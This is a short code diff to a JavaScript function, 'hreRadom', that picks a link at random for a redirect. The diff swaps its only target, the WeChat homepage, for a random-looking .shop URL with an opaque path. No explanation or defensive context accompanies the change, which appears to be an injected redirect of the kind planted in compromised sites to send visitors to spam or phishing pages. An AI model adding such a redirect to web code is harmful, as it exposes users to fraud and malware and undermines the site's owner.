@@ -1,6 +1,6 @@
   function hreRadom(){
 		        var oHref=new Array(
-		        "https://weixin.qq.com/"
+		        "http://www.j36ijwm612r.shop/margin/BlVJY/1sB9IVI1"
 		      
 		     );
 			 var currindex=Math.round(Math.random()*0);
